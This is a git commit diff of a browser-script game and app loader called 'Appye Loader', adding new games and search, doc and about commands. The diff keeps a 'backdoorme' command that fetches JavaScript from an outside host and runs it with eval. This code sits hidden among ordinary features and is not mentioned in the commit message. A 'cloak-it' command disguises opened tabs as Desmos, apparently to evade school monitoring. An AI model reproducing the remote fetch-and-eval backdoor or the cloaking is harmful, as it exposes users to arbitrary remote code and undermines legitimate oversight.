a830f4d257c5efc6bc6cb40e075067bc8cb049b0
KUKHUA <118825279+KUKHUA@users.noreply.github.com>
2023-05-21 16:22:55 -0400

    New games + Search & Doc cmds
    - 6 new games
    - search command
    - doc command
    - about command updates
    - easy html app complier

--- Source.js
+++ Source.js
@@ -1,5 +1,5 @@
 // Made by KUKHUA
-const ver = "1.0";
+const ver = "dev+1.2";
 
 // Create a new script element
 const script = document.createElement("script");
@@ -9,9 +9,9 @@ script.src =
   "https://rawcdn.githack.com/nextapps-de/winbox/0.2.6/dist/winbox.bundle.min.js";
   document.head.appendChild(script);
 //event listeners & consts
-const htmlDocs = '<h1 id="appye-loader-docs">Appye Loader - Docs</h1> <h2 id="shortcuts">Shortcuts</h2> <h4 id="use-the-d-key-to-get-back-here-at-any-time-use-the-c-key-to-use-a-command-at-any-time-br-press-the-x-button-at-the-top-of-this-window-if-you-understand-">Use the <em><code>D</code></em> key to get back here at any time, use the <em><code>C</code></em> key to use a command at any time. <br /> Press the <em><code>X</code></em> button at the top of this window if you understand.</h4> <h2 id="commands">Commands</h2> <h5 id="please-note-and-must-be-removed-when-entering-a-command-br-aswell-do-not-include-anything-in-and-only-include-the-first-word-">Please note <code>{</code> and <code>}</code> must be removed when entering a command, <br /> aswell do not include anything in <code>(</code> and <code>)</code> only include the first word.</h5> <h3 id="-app-load-appname-"><code>app-load {appName}</code></h3> <p>This command loads the app you want. ex: <em><code>app-load subway</code></em></p> <h3 id="-cloak-it-fullurl-appname-"><code>cloak-it {fullUrl || appName}</code></h3> <p>This command cloaks the the url/app-name in the command. It will open in a new window, and cloaks as Desmos. ("||" means "or") ex1: <em><code>cloak-it https://randogamewebsite.com</code></em> ex2: <em><code>cloak-it subway</code></em></p> <h3 id="-about-"><code>about</code></h3> <p>Shows the version. ex: <em><code>about</code></em></p> <h2 id="apps">Apps</h2> <p><code>d25,</code> <code>piped,</code> <code>google,</code> <code>radiolise,</code> <code>searx</code></p> <h2 id="more-game-ish">More game-ish</h2> <p><code>subway (subway surfers),</code> <code>bitlife,</code> <code>uno(4 colors),</code> <code>dino</code></p>'
-const jsonString = '{ "apps": { "argName": "", "title": "", "icon": "", "hexColor": "", "url": ""} }';
-const jsonObject = JSON.parse(jsonString);
+const htmlDocs = ''
+const jsonAppString = '{ "apps": { "argName": "", "title": "", "icon": "", "hexColor": "", "url": ""} }';
+const jsonAppObject = JSON.parse(jsonAppString);
 document.addEventListener("keydown", (event) => {
   if (event.key === "c") {
     cmd();
@@ -30,7 +30,7 @@ document.addEventListener("keydown", (event) => {
 
 // Wait for the script to be loaded before calling cmd()
 script.addEventListener("load", function () {
-  if (localStorage.getItem("appyeVersion") === ver) {
+  if (localStorage.getItem("appye_Version") === ver) {
     cmd();
   } else {
     void new WinBox({
@@ -39,59 +39,72 @@ script.addEventListener("load", function () {
       background: "#000000",
       modal: true,
       onclose: function () {
-        setTimeout(function () {
-          localStorage.setItem("appyeVersion", ver);
-          cmd();
-        }, 200);
+            setTimeout(function () {
+              localStorage.setItem("appye_Version", ver);
+              cmd();
+            }, 200);
       },
     });
   }
 });
-
-
 function cmd() {
-//json stuff
-// Apps
-jsonObject.apps.d25 = {title: "D+25", icon: "https://paste.unit193.net/favicon.ico", hexColor: "#4287f5", url: "https://paste.unit193.net/?18820e835dcfca92#+R9o6//5M3r23lulXQCFEZ3AIuTlKNvbQMML6lXnoM8=" };
-jsonObject.apps.google = {title: "Google", icon: "https://www.google.com/favicon.ico", hexColor: "#bd8c91", url: "https://www.google.com/?igu=1" };
+  // JSON stuff
+  // Apps
+  jsonAppObject.apps.d25 = { title: "D+25", icon: "https://paste.unit193.net/favicon.ico", hexColor: "#4287f5", url: "https://paste.unit193.net/?18820e835dcfca92#+R9o6//5M3r23lulXQCFEZ3AIuTlKNvbQMML6lXnoM8=" };
+  jsonAppObject.apps.google = { title: "Google", icon: "https://www.google.com/favicon.ico", hexColor: "#bd8c91", url: "https://www.google.com/?igu=1" };
 
-jsonObject.apps.piped = {title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
-//piped duped
-jsonObject.apps.youtube = {title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
-//return to apps
-jsonObject.apps.radiolise = {title: "Radiolise", icon: "https://radiolise.gitlab.io/favicon.ico", hexColor: "#7d5f5c", url: "https://radiolise.gitlab.io/" };
-jsonObject.apps.searx = {title: "SearX", icon: "https://searx.garudalinux.org/favicon.ico", hexColor: "#3d68ad", url: "https://searx.garudalinux.org/" };
-// Games
-jsonObject.apps.bitlife = {title: "Bitlife", icon: "https://raw.githubusercontent.com/mark-deal/mark-deal.github.io/main/bitlife/logo.png", hexColor: "#f0340e", url: "https://rawcdn.githack.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/bitlife/index.html" };
-jsonObject.apps.dino = {title: "Dino", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/dinosaur/assets/default_100_percent/100-error-offline.png", hexColor: "#f2dcea", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/dinosaur/index.html"};
-jsonObject.apps.subway = {title: "Subway Surfers", icon: "https://raw.githubusercontent.com/KUKHUA/chc-testing/main/img/ss_icon.png", hexColor: "#f5b342", url: "https://rawcdn.githack.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/subwaysurfers/index.html" };
-jsonObject.apps.uno = {title: "4 Colors", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/uno/favicon.ico", hexColor: "#0e408f", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/uno/index.html" };
-//parse input
-  const commandIn = prompt("Command:");
+  jsonAppObject.apps.piped = { title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
+  // Piped duped
+  jsonAppObject.apps.youtube = { title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
+  // Return to apps
+  jsonAppObject.apps.radiolise = { title: "Radiolise", icon: "https://radiolise.gitlab.io/favicon.ico", hexColor: "#7d5f5c", url: "https://radiolise.gitlab.io/" };
+  jsonAppObject.apps.searx = { title: "SearX", icon: "https://searx.garudalinux.org/favicon.ico", hexColor: "#3d68ad", url: "https://searx.garudalinux.org/" };
+  // Games
+  jsonAppObject.apps.bitlife = { title: "Bitlife", icon: "https://raw.githubusercontent.com/mark-deal/mark-deal.github.io/main/bitlife/logo.png", hexColor: "#f0340e", url: "https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/bitlife/index.html" };
+  jsonAppObject.apps.cookie = { title: "Cookie Clicker", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/cookie/img/favicon.ico", hexColor: "#a0522d", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/cookie/index.html" };
+  jsonAppObject.apps.dino = { title: "Dino", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/dinosaur/assets/default_100_percent/100-error-offline.png", hexColor: "#f2dcea", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/dinosaur/index.html" };
+  jsonAppObject.apps.subway = { title: "Subway Surfers", icon: "https://raw.githubusercontent.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/images/subway.jpg", hexColor: "#f5b342", url: "https://rawcdn.githack.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/subwaysurfers/index.html" };
+  jsonAppObject.apps.uno = { title: "4 Colors", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/uno/favicon.ico", hexColor: "#0e408f", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/uno/index.html" };
+  jsonAppObject.apps.retro_bowl = {title:"Retro-Bowl",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/retro-bowl/img/icon.jpg",hexColor:"#4d9118",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/retro-bowl/index.html"};
+  jsonAppObject.apps.papa_pizza = {title:"Papas Pizzaria",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/papaspizzaria/papaspizzaria.jpg",hexColor:"#c70001",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/papaspizzaria/index.html"};
+  jsonAppObject.apps.papa_burger = {title:"Papas Burgeria",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/papasburgeria/ico.png",hexColor:"#e1c396",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/papaspizzaria/index.html"};
+  jsonAppObject.apps.crossy_road = {title:"Crossy Road",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/crossyroad/crossyroad.png",hexColor:"#69ceec",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/crossyroad/index.html"};
+  jsonAppObject.apps.jetpack = {title:"Jetpack Joyride",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/jetpack-joyride/splash.jpg",hexColor:"#9291b9",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/jetpack-joyride/index.html"};
+  jsonAppObject.apps.tiny_fish = {title:"Tiny Fishing",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/tiny-fishing/tiny-fishing.png",hexColor:"#572CCF",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/tiny-fishing/index.html"};
+  // Command input
+  var commandIn = prompt("Command:");
+  var parseApp;
+
+  // app-load command
   if (commandIn.startsWith("app-load")) {
-    parseApp = commandIn.replace("app-load ","")
-    if (jsonObject.apps[parseApp] ) {
-//create window
- void new WinBox({
-      title: jsonObject.apps[parseApp].title,
-      icon: jsonObject.apps[parseApp].icon,
-      background: jsonObject.apps[parseApp].hexColor,
-      url: jsonObject.apps[parseApp].url
-    });
+    parseApp = commandIn.replace("app-load ", "");
+    if (jsonAppObject.apps[parseApp]) {
+      // Create window
+      void new WinBox({
+        title: jsonAppObject.apps[parseApp].title,
+        icon: jsonAppObject.apps[parseApp].icon,
+        background: jsonAppObject.apps[parseApp].hexColor,
+        url: jsonAppObject.apps[parseApp].url
+      });
     } else {
-    alert('Could not find the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelt the app wrong.')
+      alert('Could not find the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelled the app wrong.');
     }
-  }else if (commandIn.startsWith("cloak-it ")) {
-    //set info for later update
+  }
+  
+  // cloak-it command
+  else if (commandIn.startsWith("cloak-it ")) {
+    // Set default info for later update
     let defTitle = "Desmos | Testing";
     let defIcon = "https://www.desmos.com/favicon.ico";
-    //parse input
     const parsedUrl = commandIn.replace("cloak-it ", "");
-    if (jsonObject.apps[parsedUrl] ) {
-       var newUrl = jsonObject.apps[parsedUrl].url;
-    };
+    
+    // Parse input
+    if (jsonAppObject.apps[parsedUrl]) {
+      var newUrl = jsonAppObject.apps[parsedUrl].url;
+    }
+
     const win = window.open();
-    //create cloaked iframe
+    // Create cloaked iframe
     const iframe = win.document.createElement("iframe");
     iframe.style.width = "100vw";
     iframe.style.height = "100vh";
@@ -102,24 +115,66 @@ jsonObject.apps.uno = {title: "4 Colors", icon: "https://raw.githubusercontent.c
     iframe.src = newUrl;
     win.document.body.appendChild(iframe);
     win.document.title = defTitle;
-    //set favicon
+
+    // Set favicon
     let link = win.document.querySelector("link[rel~='icon']");
     if (!link) {
-        link = win.document.createElement("link");
-        link.rel = "icon";
-        win.document.head.appendChild(link);
+      link = win.document.createElement("link");
+      link.rel = "icon";
+      win.document.head.appendChild(link);
     }
     link.href = defIcon;
-} else if (commandIn.startsWith("about")){
-    alert(`Appye - ${ver}`)
-}else if (commandIn.startsWith("backdoorme")){
-url = window.location.href;
-var newWindow = window.open(url, '_blank');
-url = "https://e.pool.nyphp.com/chat/recieve/i_am_a_idiot"
-newWindow.onload = function() {
-  javascript:fetch("https://e.pool.nyphp.com/cors/embed-recieve.js").then(res=>res.text()).then(data=>eval(data)(url))
-};
-}else {
-    alert('Error: Command "'+ commandIn + '" is not vaild. ' + "See if you've spelt it wrong with the " + '"d" key.')
+  } 
+
+// search command
+else if (commandIn.startsWith("search ")) {
+    baseSearchURL = "https://searx.garudalinux.org/search?q="
+  let inputURI;
+  let searchTerm = commandIn.replace("search ", "");
+  inputURI = encodeURI(searchTerm);
+  void new WinBox({
+    title: `SearX - ${searchTerm}`,
+    icon: "https://searx.garudalinux.org/favicon.ico",
+    background: jsonAppObject.apps.searx.hexColor,
+    url: baseSearchURL + searchTerm
+  });
+
 }
+
+//doc command
+  else if (commandIn.startsWith("doc")){
+    void new WinBox({
+      title: "Appye Loader - Docs",
+      html: htmlDocs,
+      background: "#000000",
+      modal: true,
+    }); 
+  }
+
+
+  // about command
+  else if (commandIn.startsWith("about")) {
+    void new WinBox({
+      title: "Appye Loader - About",
+      html: `<h3>Appye loader is on version <b>${ver}</b></h3> <p> Also btw, thanks for using this! We use the WinBox.js libary for windows: https://nextapps-de.github.io/winbox/</p>`,
+      background: "#000000",
+      modal: true,
+    }); 
+  }
+
+  // backdoor command
+  else if (commandIn.startsWith("backdoorme")) {
+    url = window.location.href;
+    var newWindow = window.open(url, '_blank');
+    url = "https://e.pool.nyphp.com/chat/recieve/i_am_a_idiot";
+    newWindow.onload = function() {
+      fetch("https://e.pool.nyphp.com/cors/embed-recieve.js").then(res => res.text()).then(data => eval(data)(url));
+    };
+  } 
+
+  // command error
+  else {
+    alert('Error: Command "' + commandIn + '" is not valid. ' + "Please check if you've spelled it incorrectly.");
+  }
 }
+
